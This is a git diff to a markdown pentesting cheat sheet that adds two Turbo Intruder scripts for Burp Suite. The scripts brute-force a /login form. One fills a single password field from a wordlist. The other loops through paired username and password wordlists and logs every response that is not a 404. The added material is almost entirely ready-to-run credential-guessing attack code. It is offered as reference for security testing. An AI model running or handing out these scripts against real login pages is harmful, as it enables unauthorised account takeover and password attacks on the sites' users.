@@ -38,9 +38,17 @@ option 7. In the Macro editor -> Click "Test macro" to check if the sequence doe
 
 <br />
 
-## Turbo Intruder Examples
+## Turbo Intruder (Single Parameter)
+
+Set **“%s”** to the parameter for brute force.
 
 ```python
+POST /login HTTP/1.1
+...
+username=admin&password=%s
+
+# -------------------------------------------------------------------
+
 def queueRequests(target, wordlists):
     engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=5,
@@ -74,5 +82,37 @@ def queueRequests(target, wordlists):
 
 def handleResponse(req, interesting):
     if interesting:
+        table.add(req)
+```
+
+<br />
+
+## Turbo Intruder (Multiple Parameters)
+
+Set **multipla “%s”** to the parameters for brute force.
+
+```python
+
+POST /login HTTP/1.1
+...
+username=%s&password=%s
+
+# --------------------------------------------------------------
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=100,
+                           pipeline=False
+                           )
+
+    for firstWord in open('/path/to/usernames'):
+      for secondWord in open('/path/to/passwords'):
+        engine.queue(target.req, [firstWord.rstrip(), secondWord.rstrip()])
+
+
+def handleResponse(req, interesting):
+    # currently available attributes are req.status, req.wordcount, req.length and req.response
+    if req.status != 404:
         table.add(req)
 ```
